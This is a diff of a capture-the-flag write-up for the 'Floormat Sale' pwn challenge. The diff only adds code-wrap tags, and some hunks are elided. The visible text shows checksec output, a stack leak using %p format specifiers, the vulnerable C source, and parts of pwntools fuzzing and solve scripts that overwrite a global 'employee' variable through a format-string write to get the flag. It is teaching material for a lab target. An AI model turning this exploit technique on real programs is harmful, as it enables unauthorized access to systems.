@@ -28,6 +28,7 @@ If you played last 1337UPLIVE last year, you might remember the [floormat store]
 
 First, check the binary protections.
 
+{% code overflow="wrap" %}
 ```bash
 checksec --file floormat_sale
 [*] '/home/crystal/Desktop/challs/pwn/FloormatSale/solution/floormat_sale'
@@ -37,11 +38,13 @@ checksec --file floormat_sale
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+{% endcode %}
 
 You might think buffer overflow because there's no stack canaries, but that is not the case.
 
 Let's see what the functionality looks like this time.
 
+{% code overflow="wrap" %}
 ```bash
 nc localhost 1339
 Welcome to the Floor Mat Mega Sale!
@@ -69,9 +72,11 @@ cryptocat!
 
 Access Denied: You are not an employee!
 ```
+{% endcode %}
 
 Alright, like last time then, let's try and provide a [format specifier](https://www.geeksforgeeks.org/format-specifiers-in-c) to see if we can [leak values](https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities) from the stack.
 
+{% code overflow="wrap" %}
 ```bash
 Please enter your shipping address:
 %p %p %p %p %p %p %p
@@ -82,11 +87,13 @@ Your floor mat will be shipped to:
 
 Access Denied: You are not an employee
 ```
+{% endcode %}
 
 Bingo! We could try leaking values from the stack and converting from hex, or using the `%s` specifier but the flag isn't there this time (wouldn't be a new challenge then, would it?).
 
 You'll want to disassemble the code to see what's going on. I cba rn so here's the original source.
 
+{% code overflow="wrap" %}
 ```c
 int employee = 0;
 
@@ -106,6 +113,7 @@ void employee_access() {
     }
 }
 ```
+{% endcode %}
 
 The function is called when we use the menu option `6`. There's nothing in the code that will ever change the `employee` variable, hopefully this is a hint you need to overwrite that variable.
 
@@ -113,6 +121,7 @@ I've covered format string write attacks on my [youtube](https://www.youtube.com
 
 ### fuzz.py
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -173,9 +182,11 @@ for i in range(leak_count):
 # Close the process after testing
 io.close()
 ```
+{% endcode %}
 
 We run that and see our `AAAA` lands at various offsets, e.g. `8`, `10`, `12` etc.
 
+{% code overflow="wrap" %}
 ```bash
 python fuzz.py REMOTE 127.0.0.1 1339
 [+] Opening connection to 127.0.0.1 on port 1339: Done
@@ -211,6 +222,7 @@ Leaked value at %<26$p>: 0x2431252041414141
 Leaked value at %<27$p>: AAAA
 Leaked value at %<28$p>: 0x2520414141412070
 ```
+{% endcode %}
 
 Not all of these offsets will work. I tried `8` and it didn't work but `10` did. You should be able to automate this stage as well but I couldn't get it working (I don't do pwn challenges anymore xD).
 
@@ -218,6 +230,7 @@ So here's a `pwntools` script to solve the challenge for us! It will overwrite t
 
 ### solve.py
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -277,14 +290,17 @@ io.recvuntil(b'Exclusive Employee-only Mat will be delivered to: ')
 flag = io.recvline()
 success(f'Flag: {flag.decode()}')
 ```
+{% endcode %}
 
 When we enter menu option `6`, we'll get the flag.
 
+{% code overflow="wrap" %}
 ```bash
 python solve.py REMOTE 127.0.0.1 1339
 [*] Employee variable address: 0x40408c
 [*] Using format string offset: 10
 [+] Flag: INTIGRITI{fake_flag}
 ```
+{% endcode %}
 
 Flag: `INTIGRITI{3v3ry_fl00rm47_mu57_60!!}`
